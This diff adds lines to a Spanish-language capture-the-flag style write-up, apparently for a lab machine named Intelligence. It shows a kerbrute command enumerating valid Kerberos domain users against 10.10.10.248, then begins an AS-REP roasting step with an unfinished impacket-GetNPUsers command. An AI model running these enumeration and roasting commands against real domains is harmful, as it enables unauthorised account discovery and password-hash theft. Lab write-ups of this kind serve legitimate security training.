@@ -146,3 +146,14 @@ William.Lee
 
 ### Enumeración de usuarios validos del dominio con kerberos
 
+`kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users`
+
+Todo los usuarios se nos muestran como validos
+
+Con todos los usuarios vamops a probar
+
+### AS-REP ROAST ATACK
+
+Solicitarimos los tikets TGT
+
+`impacket-GetNPUsers `
